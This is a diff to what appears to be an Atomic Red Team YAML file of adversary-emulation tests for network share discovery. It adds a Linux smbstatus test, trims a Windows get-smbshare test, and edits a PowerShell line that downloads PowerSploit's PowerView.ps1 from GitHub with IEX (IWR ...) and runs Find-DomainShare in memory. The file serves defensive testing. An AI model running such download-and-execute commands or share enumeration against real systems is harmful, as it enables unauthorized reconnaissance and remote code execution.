@@ -7,7 +7,6 @@ atomic_tests:
     Network Share Discovery
   supported_platforms:
   - macos
-  - linux
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
@@ -19,6 +18,34 @@ atomic_tests:
       smbutil view -g //#{computer_name}
       showmount #{computer_name}
     name: sh
+- name: Network Share Discovery - linux
+  auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
+  description: |
+    Network Share Discovery using smbstatus
+  supported_platforms:
+  - linux
+  input_arguments:
+    package_checker:
+      description: Package checking command. Debian - dpkg -s samba
+      type: string
+      default: rpm -q samba
+    package_installer:
+      description: Package installer command. Debian - apt install samba
+      type: string
+      default: yum install -y samba
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Package with smbstatus (samba) must exist on device
+    prereq_command: |
+      if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      sudo #{package_installer} 
+  executor:
+    command: |
+      smbstatus --shares
+    name: bash
+    elevation_require: true
 - name: Network Share Discovery command prompt
   auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
   description: |
@@ -42,15 +69,9 @@ atomic_tests:
     Upon execution, avalaible network shares will be displayed in the powershell session
   supported_platforms:
   - windows
-  input_arguments:
-    computer_name:
-      description: Computer name to find a mount on.
-      type: string
-      default: localhost
   executor:
     command: |
-      net view \\#{computer_name}
-      get-smbshare -Name #{computer_name}
+      get-smbshare
     name: powershell
 - name: View available share drives
   auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
@@ -69,6 +90,6 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-DomainShare -CheckShareAccess -Verbose
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
 
